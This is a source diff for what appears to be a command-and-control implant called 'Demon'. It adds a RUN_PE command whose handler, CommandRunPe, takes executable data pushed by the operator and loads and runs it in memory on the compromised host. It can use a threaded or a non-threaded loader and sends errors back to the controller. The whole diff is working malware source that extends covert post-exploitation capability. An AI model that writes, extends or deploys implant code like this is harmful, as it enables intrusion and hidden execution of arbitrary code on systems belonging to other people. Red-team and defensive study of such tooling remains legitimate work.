@@ -33,6 +33,7 @@ SEC_DATA DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_TOKEN,                    .Function = CommandToken                    },
         { .ID = DEMON_COMMAND_TRANSFER,                 .Function = CommandTransfer                 },
         { .ID = DEMON_COMMAND_SOCKET,                   .Function = CommandSocket                   },
+        { .ID = DEMON_COMMAND_RUN_PE,                   .Function = CommandRunPe                    },
         { .ID = DEMON_EXIT,                             .Function = CommandExit                     },
 
         // End
@@ -2791,7 +2792,65 @@ VOID CommandSocket( PPARSER Parser )
     PackageTransmit( Package, NULL, NULL );
 }
 
-// TODO: rewrite this. disconnect all pivots. kill our threads. release memory and free itself.
+VOID CommandRunPe( PPARSER Parser )
+{
+    DWORD FunctionNameSize = 0;
+    DWORD ObjectDataSize   = 0;
+    DWORD ArgSize          = 0;
+    DWORD Status           = 0;
+    PCHAR FunctionName     = ParserGetBytes( Parser, &FunctionNameSize );
+    PCHAR ObjectData       = ParserGetBytes( Parser, &ObjectDataSize );
+    PCHAR ArgBuffer        = ParserGetBytes( Parser, &ArgSize );
+    INT32 Flags            = ParserGetInt32( Parser );
+
+    FunctionName[ FunctionNameSize ] = 0;
+
+    switch ( Flags )
+    {
+        case 0:
+        {
+            PUTS( "Use Non-Threaded PeLdr" )
+            Status = PeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
+            if ( Status )
+            {
+                PackageTransmitError( CALLBACK_ERROR_PEEXEC, Status );
+            }
+            break;
+        }
+
+        case 1:
+        {
+            PUTS( "Use Threaded PeRunner" )
+            PeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
+            break;
+        }
+
+        default:
+        {
+            PUTS( "Use default (from config) PeLdr" )
+
+            if ( Instance.Config.Implant.PeThreaded )
+            {
+                PUTS( "Config is set to threaded" )
+                PeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
+            }
+            else
+            {
+                PUTS( "Config is set to non-threaded" )
+                Status = PeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
+                if ( Status )
+                {
+                    PackageTransmitError( CALLBACK_ERROR_PEEXEC, Status );
+                }
+            }
+
+            break;
+        }
+    }
+
+    MemSet( ObjectData, 0, ObjectDataSize );
+}
+
 VOID CommandExit( PPARSER Parser )
 {
     PUTS( "Exit" );
